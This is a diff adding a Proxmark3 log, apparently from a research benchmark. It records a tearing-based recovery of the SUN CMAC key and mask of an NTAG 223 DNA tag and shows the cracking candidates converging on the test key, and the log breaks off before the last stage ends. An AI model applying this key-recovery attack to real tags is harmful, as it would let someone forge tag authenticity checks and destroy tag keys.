@@ -1,0 +1,102 @@
+[=] No preferences file will be loaded
+[+] execute command from commandline: script run ntag22x_suncmac_recovery --format --initkey 0x2b7e151628aed2a6abf7158809cf4f3c --json recover_suncmac_and_mask_045314EA841390_mac_data.json
+
+[+] Using UART port /dev/ttyACM0
+[+] Communicating with PM3 over USB-CDC
+[=] No history will be recorded
+[usb|script] pm3 --> script run ntag22x_suncmac_recovery --format --initkey 0x2b7e151628aed2a6abf7158809cf4f3c --json recover_suncmac_and_mask_045314EA841390_mac_data.json
+[+] executing python /home/debian/RFID/paper/benchmarks/proxmark_ulcg/client/pyscripts/ntag22x_suncmac_recovery.py
+[+] args '--format --initkey 0x2b7e151628aed2a6abf7158809cf4f3c --json recover_suncmac_and_mask_045314EA841390_mac_data.json'
+Detected NTAG 223 DNA StatusDetect
+NDEF: http://www.foo.bar?uid=045314EA841390x000000x0000000000x54FE60931236664F
+Detected MIRROR_PAGE=8, MIRROR_BYTE=3
+Reading message: >>045314EA841390x000000x0000000000x54FE60931236664F<<
+Reading CMAC: >>54FE60931236664F<<
+
+Tearing progressively from UUUU to MMMM:
+* UUUU to MUUU: ......
+* MUUU to MMUU: .........
+* MMUU to MMMU: ..............
+* MMMU to MMMM: ......
+Tearing progressively from ZZZZ to MMMM:
+* ZZZZ to MZZZ: ......
+* MZZZ to MMZZ: .......
+* MMZZ to MMMZ: ..........
+* MMMZ to MMMM: .....
+
+[+] Challenges saved to recover_suncmac_and_mask_045314EA841390_mac_data.json.
+[!] Beware that the card SUNCMAC_KEY is now erased!
+
+Cracking mask progressively from ZZZZ to MMMM:
+* ZZZZ to MZZZ:
+  * 00000000000000000000000000000000 at HD=0, tried        1 candidates
+  * 00000000000000000000000082040D81 at HD=8, tried  6671904 candidates
+  * 00000000000000000000000082170FA1 at HD=5, tried   169176 candidates
+  * 000000000000000000000000A2970FA1 at HD=2, tried      504 candidates
+  * 000000000000000000000000A2973FA1 at HD=2, tried      344 candidates
+  * 000000000000000000000000B2973FA1 at HD=1, tried       32 candidates
+* MZZZ to MMZZ:
+  * 000000000000000000000000B2973FA1 at HD=0, tried        1 candidates
+  * 000000000000000000000002B2973FA1 at HD=1, tried        8 candidates
+  * 000000000000000000900082B2973FA1 at HD=3, tried     3408 candidates
+  * 000000000000000004F08082B2973FA1 at HD=4, tried    39472 candidates
+  * 000000000000000044F08C82B2973FA1 at HD=3, tried     3968 candidates
+  * 0000000000000000C4F49C82B2973FA1 at HD=3, tried     4448 candidates
+  * 0000000000000000C4F4BC82B2973FA1 at HD=1, tried       16 candidates
+* MMZZ to MMMZ:
+  * 0000000000000000C4F4BC82B2973FA1 at HD=0, tried        1 candidates
+  * 0000000021000000C4F4BC82B2973FA1 at HD=2, tried      512 candidates
+  * 0000000021008000C4F4BC82B2973FA1 at HD=1, tried       24 candidates
+  * 0000000023018000C4F4BC82B2973FA1 at HD=2, tried      424 candidates
+  * 0000000023158008C4F4BC82B2973FA1 at HD=3, tried     2128 candidates
+  * 0000000033158888C4F4BC82B2973FA1 at HD=3, tried     3272 candidates
+  * 000000003B158888C4F4BC82B2973FA1 at HD=1, tried       32 candidates
+  * 000000003F15C889C4F4BC82B2973FA1 at HD=3, tried      856 candidates
+  * 000000003F55C889C4F4BC82B2973FA1 at HD=1, tried       24 candidates
+  * 000000003FD5C8C9C4F4BC82B2973FA1 at HD=2, tried      224 candidates
+* MMMZ to MMMM:
+  * 000000003FD5C8C9C4F4BC82B2973FA1 at HD=0, tried        1 candidates
+  * 600400093FD5C8C9C4F4BC82B2973FA1 at HD=5, tried    52152 candidates
+  * 618460593FD5C8C9C4F4BC82B2973FA1 at HD=6, tried   796104 candidates
+  * 618CE2593FD5C8C9C4F4BC82B2973FA1 at HD=3, tried     3824 candidates
+  * 638CE2593FD5C8C9C4F4BC82B2973FA1 at HD=1, tried       32 candidates
+
+Cracking CMACs progressively from MMMM to UUUU:
+* MMMM to MMMU:
+  * 638CE2593FD5C8C9C4F4BC82B2973FA1 at HD=0, tried        1 candidates
+  * 638C30593FD5C8C9C4F4BC82B2973FA1 at HD=4, tried    33016 candidates
+  * 638C10593FD5C8C9C4F4BC82B2973FA1 at HD=1, tried       16 candidates
+  * 631C34193FD5C8C9C4F4BC82B2973FA1 at HD=5, tried   182832 candidates
+  * 637C14113FD5C8C9C4F4BC82B2973FA1 at HD=3, tried     2160 candidates
+  * 2B7E15163FD5C8C9C4F4BC82B2973FA1 at HD=7, tried  1163544 candidates
+* MMMU to MMUU:
+  * 2B7E15163FD5C8C9C4F4BC82B2973FA1 at HD=0, tried        1 candidates
+  * 2B7E15163FD7C8C9C4F4BC82B2973FA1 at HD=1, tried       24 candidates
+  * 2B7E15163FD5C8C9C4F4BC82B2973FA1 at HD=1, tried       24 candidates
+  * 2B7E15163FD5C889C4F4BC82B2973FA1 at HD=2, tried      216 candidates
+  * 2B7E15163FD5C8C9C4F4BC82B2973FA1 at HD=2, tried      216 candidates
+  * 2B7E15163FD7D8ADC4F4BC82B2973FA1 at HD=3, tried     1496 candidates
+  * 2B7E15163F97D8ADC4F4BC82B2973FA1 at HD=1, tried       24 candidates
+  * 2B7E15163B97D8ADC4F4BC82B2973FA1 at HD=1, tried       32 candidates
+  * 2B7E15163B97D0AEC4F4BC82B2973FA1 at HD=3, tried      544 candidates
+  * 2B7E15163B9FD0AEC4F4BC82B2973FA1 at HD=1, tried       24 candidates
+  * 2B7E15163BBFD0A6C4F4BC82B2973FA1 at HD=2, tried      144 candidates
+  * 2B7E15162BAFD2A6C4F4BC82B2973FA1 at HD=3, tried     3896 candidates
+  * 2B7E151629AED2A6C4F4BC82B2973FA1 at HD=2, tried      424 candidates
+  * 2B7E151628AED2A6C4F4BC82B2973FA1 at HD=1, tried       32 candidates
+* MMUU to MUUU:
+  * 2B7E151628AED2A6C4F4BC82B2973FA1 at HD=0, tried        1 candidates
+  * 2B7E151628AED2A6C4F5BC82B2973FA1 at HD=1, tried       24 candidates
+  * 2B7E151628AED2A6C4F4BC82B2973FA1 at HD=1, tried       24 candidates
+  * 2B7E151628AED2A6C6F5BC8AB2973FA1 at HD=2, tried      152 candidates
+  * 2B7E151628AED2A6C6F59C8AB2973FA1 at HD=1, tried       16 candidates
+  * 2B7E151628AED2A68BF5948AB2973FA1 at HD=5, tried   227272 candidates
+  * 2B7E151628AED2A68BF7158AB2973FA1 at HD=3, tried     3584 candidates
+  * 2B7E151628AED2A6ABF7158AB2973FA1 at HD=1, tried       32 candidates
+  * 2B7E151628AED2A6ABF71588B2973FA1 at HD=1, tried        8 candidates
+* MUUU to UUUU:
+  * 2B7E151628AED2A6ABF71588B2973FA1 at HD=0, tried        1 candidates
+  * 2B7E151628AED2A6ABF71588A2973FA1 at HD=1, tried       32 candidates
+  * 2B7E151628AED2A6ABF71588A3973FA1 at HD=1, tried       32 candidates
+  * 2B7E151628AED2A6ABF7158883974FA1 at HD=4, tried    36624 candidates
+  * 2B7E151628AED2A6ABF7158803974FA9 at HD=2, tried      152 candidates
